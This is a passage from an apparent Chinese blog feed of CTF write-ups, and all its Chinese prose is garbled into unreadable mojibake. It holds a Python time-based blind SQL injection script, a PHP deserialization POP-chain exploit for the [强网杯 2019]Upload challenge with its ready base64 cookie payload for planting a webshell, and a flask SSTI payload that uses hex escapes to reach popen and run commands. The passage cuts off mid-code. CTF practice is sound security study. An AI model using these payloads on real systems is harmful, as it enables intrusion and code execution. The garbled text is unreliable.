æ‰€æŸ¥è¯¢çš„å¯¹è±¡idå€¼ä¸èƒ½ä¸ºç©ºï¼&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ—¶é—´çš„ç›²æ³¨ï¼Œä½¿ç”¨benchmarkã€‚è„šæœ¬ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import sys, string, requests</span><br><span class="line"></span><br><span class="line">version_chars &#x3D; &quot;.-&#123;&#125;_&quot; + string.ascii_letters + string.digits + &#39;#&#39;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1,40):</span><br><span class="line">    for char in version_chars:</span><br><span class="line">        payload &#x3D; &quot;-1 or if(ascii(mid((select flag from flag),%s,1))&#x3D;%s,benchmark(200000000,7^3^8),0)&quot; % (i,ord(char))</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;index.php?id&#x3D;%s&quot; % payload</span><br><span class="line">        if char &#x3D;&#x3D; &#39;#&#39;:</span><br><span class="line">            if(flag):</span><br><span class="line">                sys.stdout.write(&quot;\n[+] The flag isï¼š %s&quot; % flag)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[-] Something run error!&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        try:</span><br><span class="line">            r &#x3D; requests.post(url&#x3D;url, timeout&#x3D;2.0)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            flag +&#x3D; char</span><br><span class="line">            sys.stdout.write(&quot;\r[-] Try to get flagï¼š %s&quot; % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            break</span><br><span class="line">print(&quot;[-] Something run error!&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨githubä¸Šé¢æ‰¾çš„ä¸€ä¸ªä»£ç å®¡è®¡çš„é¡¹ç›®ï¼Œåœ°å€æ˜¯ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/hongriSec/PHP-Audit-Labs/&quot;&gt;https://github.com/hongriSec/PHP-Audit-Labs/&lt;/a&gt;&lt;br&gt;æ­£å¥½é€šè¿‡è¿™ä¸ªé¡¹ç›®ç»ƒä¹ ä¸€ä¸‹ä»£ç å®¡è®¡ï¼Œæ¯ä¸ªéƒ½åŒ…å«äº†ä¸åŒçš„çŸ¥è¯†ç‚¹ï¼Œå­¦ä¹ å­¦ä¹ ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>buuåˆ·é¢˜è®°å½•ï¼ˆä¸‰ï¼‰</title>
    <link href="http://yoursite.com/2020/08/10/buuoj-03/"/>
    <id>http://yoursite.com/2020/08/10/buuoj-03/</id>
    <published>2020-08-10T04:55:56.000Z</published>
    <updated>2020-09-16T05:12:38.341Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h1><blockquote><p>ä»£ç å®¡è®¡ï¼Œååºåˆ—åŒ–</p></blockquote><p>ä»£ç å®¡è®¡çœŸçš„å¤´ç–¼ï¼Œå¤ªéš¾äº†ã€‚<br>è¿›å…¥é¡µé¢æœ‰ä¸ªç™»é™†æ¡†ï¼Œæ³¨å†Œç™»é™†ï¼Œæœ‰ä¸ªä¸Šä¼ é¡µé¢ï¼Œè¯•äº†ä¸Šä¼ webshellæ— æœï¼Œçœ‹cookieæ˜¯ä¸€æ®µç¼–ç ï¼Œè§£ç ä¹‹åæ˜¯åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè‚¯å®šå°±æ˜¯ååºåˆ—åŒ–äº†ï¼Œæ‰«åå°å‘ç°<strong><a href="http://www.tar.gz">www.tar.gz</a></strong>ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œå®¡è®¡æºç ã€‚</p><a id="more"></a><p>æ–‡ä»¶è¿™ä¹ˆå¤šï¼Œæ—¢ç„¶æ˜¯ååºåˆ—åŒ–ï¼Œç›´æ¥æœç´¢ååºåˆ—åŒ–çš„é­”æ³•å‡½æ•°ï¼Œè¿™æ ·å¿«ä¸€ç‚¹ï¼Œä¸€èˆ¬éƒ½æ˜¯æœç´¢<strong>__call</strong>å’Œ<strong>__destruct</strong>ï¼Œ<br>ç„¶ååœ¨<code>application/web/controller/Profile.php</code>è¿™ä¸ªæ–‡ä»¶é‡Œå‘ç°äº†<code>__call</code>æ–¹æ³•å’Œ<code>__get__</code>æ–¹æ³•</p><ul><li><strong>callï¼šå½“è°ƒç”¨ç±»ä¸­ä¸å¯è®¿é—®å±æ€§æ—¶ï¼Œ</strong>callå°†è‡ªåŠ¨è¢«è°ƒç”¨ã€‚</li><li><strong>getï¼š å½“è°ƒç”¨ç±»ä¸­ä¸å¯è®¿é—®å¯¹è±¡æ—¶ï¼Œ</strong>getå°†è‡ªåŠ¨è¢«è°ƒç”¨ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"># Profile.php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"></span><br><span class="line">use think\Controller;</span><br><span class="line"></span><br><span class="line">class Profile extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $img;</span><br><span class="line">    public $except;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Index();</span><br><span class="line">        $this-&gt;upload_menu&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">        @chdir(&quot;..&#x2F;public&#x2F;upload&quot;);</span><br><span class="line">        if(!is_dir($this-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir($this-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir($this-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function upload_img()&#123;</span><br><span class="line">        if($this-&gt;checker)&#123;</span><br><span class="line">            if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;index&quot;;</span><br><span class="line">                $this-&gt;redirect($curr_url,302);</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_FILES))&#123;</span><br><span class="line">            $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">                @unlink($this-&gt;filename_tmp);</span><br><span class="line">                $this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;..&#x2F;index&#39;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;..&#x2F;index&#39;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_img()&#123;</span><br><span class="line">        $user_info&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();</span><br><span class="line">        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img)&#123;</span><br><span class="line">            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;&#x3D;&gt;addslashes($this-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                $this-&gt;update_cookie();</span><br><span class="line">                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;..&#x2F;home&#39;));</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;..&#x2F;index&#39;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_cookie()&#123;</span><br><span class="line">        $this-&gt;checker-&gt;profile[&#39;img&#39;]&#x3D;$this-&gt;img;</span><br><span class="line">        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function ext_check()&#123;</span><br><span class="line">        $ext_arr&#x3D;explode(&quot;.&quot;,$this-&gt;filename);</span><br><span class="line">        $this-&gt;ext&#x3D;end($ext_arr);</span><br><span class="line">        if($this-&gt;ext&#x3D;&#x3D;&quot;png&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>è¿™ä¸ªç±»ä¸»è¦å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„é€»è¾‘ï¼Œåˆ›å»ºç›®å½•ï¼Œé‡å‘½åæ–‡ä»¶ï¼Œä¿®æ”¹åç¼€ï¼Œä¸Šä¼ æ–‡ä»¶ã€‚ä¸ç®¡æ˜¯ä»€ä¹ˆæ–‡ä»¶éƒ½ä¼šä¿®æ”¹æˆpngæ ¼å¼çš„ã€‚<br>ä½†æ˜¯åªæœ‰è¿™ä¸€ä¸ªç±»ä¹Ÿæ²¡æ³•ä½¿ç”¨ï¼Œå†æŸ¥æ‰¾<strong>__destruct</strong>å‡½æ•°ï¼Œåœ¨<code>application/web/controller/Register.php</code>æ–‡ä»¶ä¸­æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•ã€‚<br>å…³é”®ä»£ç å¦‚ä¸‹ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Register.php</span><br><span class="line">&lt;?php</span><br><span class="line">class Register extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Index();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;registed)&#123;</span><br><span class="line">            $this-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œè°ƒç”¨<code>__destruct</code>æ–¹æ³•ï¼Œè°ƒç”¨<code>$this-&gt;checker</code>å¯¹è±¡çš„<code>index()</code>å‡½æ•°ï¼Œè€ŒProfileç±»ä¸­æ˜¯æ²¡æœ‰è¿™ä¸ªå‡½æ•°çš„ï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸè§¦å‘<strong>__call</strong>æ–¹æ³•ï¼Œ<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function __get($name)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>è¯´ä¸€ä¸‹è¿™é‡Œ<strong>callçš„ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°<code>$name</code>ä¼šè‡ªåŠ¨æ¥æ”¶ä¸å­˜åœ¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ª<code>$arguments</code>åˆ™ä»¥æ•°ç»„çš„æ–¹å¼æ¥æ”¶ä¸å­˜åœ¨æ–¹æ³•çš„å¤šä¸ªå‚æ•°ã€‚<br>åœ¨```</strong>destruct<code>ä¸­è°ƒç”¨$this-&gt;checker-&gt;index()ï¼Œindexå°±ä¼šå˜æˆ__callçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’è¿›å»ï¼Œè€Œindex()ä¸­æ²¡æœ‰å‚æ•°ï¼Œ__callä¸­çš„ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿå°±ä¸ºç©ºã€‚å‚æ•°ä¼ é€’è¿›å»åï¼Œå°±å˜æˆåœ¨__callä¸­è°ƒç”¨ **$this-&gt;index()**ï¼Œè€Œè¿™ä¸ªç±»ä¸­æ˜¯æ²¡æœ‰è¿™ä¸ªå¯¹è±¡çš„ï¼Œç„¶åè§¦å‘ **__get** æ–¹æ³•ã€‚ç„¶åçœ‹</code>application/web/controller/Index.php```æ–‡ä»¶ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $profile;</span><br><span class="line">    public $profile_db;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;login_check())&#123;</span><br><span class="line">            $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;home&quot;;</span><br><span class="line">            $this-&gt;redirect($curr_url,302);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;fetch(&quot;index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function login_check()&#123;</span><br><span class="line">        $profile&#x3D;cookie(&#39;user&#39;);</span><br><span class="line">        if(!empty($profile))&#123;</span><br><span class="line">            $this-&gt;profile&#x3D;unserialize(base64_decode($profile));</span><br><span class="line">            $this-&gt;profile_db&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#39;ID&#39;]))-&gt;find();</span><br><span class="line">            if(array_diff($this-&gt;profile_db,$this-&gt;profile)&#x3D;&#x3D;null)&#123;</span><br><span class="line">                return 1;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>åœ¨<strong>index()</strong>ä¸­è°ƒç”¨<strong>login_check()</strong>ï¼Œè€Œåœ¨login_check()ä¸­æŠŠcookieä¸­ä¼ æ¥çš„å€¼ç›´æ¥è¿›è¡Œååºåˆ—åŒ–ï¼Œ<br>æˆ‘ä»¬å†çœ‹Profileç±»ä¸­<br><img src="/images/buuoj-03/20200810135451.png" alt=""><br>åœ¨<strong>upload_img()</strong>å‡½æ•°å¼€å§‹æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨login_check()ï¼Œç„¶åå†å¾€ä¸‹çœ‹<br><img src="/images/buuoj-03/20200810140123.png" alt=""><br>è¿™é‡Œä¼šå°†æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡é‡å‘½åå°†å·²ç»ä¸Šä¼ çš„pngæ–‡ä»¶é‡å‘½åä¸ºphpæ–‡ä»¶ï¼Œä»è€Œè·å–webshellï¼Œå‰é¢é‚£ä¸ªæ£€æŸ¥æ–‡ä»¶ååç¼€åªæœ‰åœ¨é€šè¿‡è¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶æ‰ä¼šè§¦å‘ã€‚<br>è¿™æ ·æ€è·¯å°±æ¸…æ¥šäº†ï¼Œ<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt;Register-&gt;__destruct()</span><br><span class="line">&#x3D;&#x3D;&gt;Profile-&gt;__call()</span><br><span class="line">&#x3D;&#x3D;&gt;Profile-&gt;__get()</span><br><span class="line">&#x3D;&#x3D;&gt;Profile-&gt;upload_img()</span><br></pre></td></tr></table></figure>å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªå†™æœ‰weshellçš„jpgåç¼€çš„æ–‡ä»¶ï¼Œç„¶åé€šè¿‡è®¿é—®/upload/è·å–æ–‡ä»¶åï¼Œæ¥ä¸‹æ¥å°±å¼€å§‹æ„é€ ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"> </span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $img;</span><br><span class="line">    public $except;</span><br><span class="line"> </span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;registed)&#123;</span><br><span class="line">            $this-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$profile &#x3D; new Profile();</span><br><span class="line">$profile-&gt;except &#x3D; [&#39;index&#39; &#x3D;&gt; &#39;img&#39;];</span><br><span class="line">$profile-&gt;img &#x3D; &quot;upload_img&quot;;</span><br><span class="line">$profile-&gt;ext &#x3D; &quot;png&quot;;</span><br><span class="line">$profile-&gt;filename_tmp &#x3D; &quot;..&#x2F;public&#x2F;upload&#x2F;04b0951938d905b41348c1548f9c338b&#x2F;197eb9d5e3830b156293e9c9d951518b.png&quot;;</span><br><span class="line">$profile-&gt;filename &#x3D; &quot;..&#x2F;public&#x2F;upload&#x2F;04b0951938d905b41348c1548f9c338b&#x2F;197eb9d5e3830b156293e9c9d951518b.php&quot;;</span><br><span class="line"> </span><br><span class="line">$register &#x3D; new Register();</span><br><span class="line">$register-&gt;registed &#x3D; false;</span><br><span class="line">$register-&gt;checker &#x3D; $profile;</span><br><span class="line"> </span><br><span class="line">echo urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>å› ä¸ºé‚£å‡ ä¸ªæ–‡ä»¶éƒ½åŠ äº†namespaceï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ„é€ çš„æ—¶å€™ä¹Ÿè¦åŠ ä¸Šï¼Œè¿è¡Œè¿™ä¸ªå¾—åˆ°payloadï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkLzA0YjA5NTE5MzhkOTA1YjQxMzQ4YzE1NDhmOWMzMzhiLzE5N2ViOWQ1ZTM4MzBiMTU2MjkzZTljOWQ5NTE1MThiLnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC8wNGIwOTUxOTM4ZDkwNWI0MTM0OGMxNTQ4ZjljMzM4Yi8xOTdlYjlkNWUzODMwYjE1NjI5M2U5YzlkOTUxNTE4Yi5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9</span><br></pre></td></tr></table></figure>ä¼ å…¥cookieä¸­ï¼Œç„¶åè®¿é—®æˆ‘ä»¬çš„weshellï¼Œå¾—åˆ°flagã€‚<br><img src="/images/buuoj-03/20200810141422.png" alt=""></li></ul><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>é¦–å…ˆè¯•ä¸€ä¸‹49å‘ç°å­˜åœ¨sstiæ³¨å…¥ï¼Œç„¶åå‘ç° <code>&#39;._</code> è¿™ä¸‰ä¸ªç¬¦å·è¢«banäº†ã€‚<br>ä¸€èˆ¬æ–¹æ³•å¥½åƒéƒ½ç”¨ä¸äº†äº†ï¼Œä»Šå¤©å­¦åˆ°ä¸€ç§æ–°çš„ç»•è¿‡æ–¹æ³•ï¼Œä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œåœ¨æ¨¡æ¿æ³¨å…¥æ—¶å¯ä»¥ä½¿ç”¨ï¼Œä½†æ­£å¸¸çš„pythonè¯­æ³•æ˜¯ä¸æ”¯æŒçš„ã€‚</p><ul><li>â€œ.â€çš„åå…­è¿›åˆ¶å°±æ˜¯\x2e</li><li>â€œ_â€çš„åå…­è¿›åˆ¶å°±æ˜¯\x5f</li><li>å•å¼•å·ç”¨åŒå¼•å·ä»£æ›¿<br>å°±åƒè¿™æ ·ï¼šç­‰ä»·äº<br>å…ˆç”¨ä¸‹é¢è¿™ä¸ªpayloadè¯»å–åˆ°app.pyçš„æºç <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat app\x2epy&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>æºç ï¼Œåªæ”¾å…³é”®éƒ¨åˆ†äº†ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def encode(line, key, key2):</span><br><span 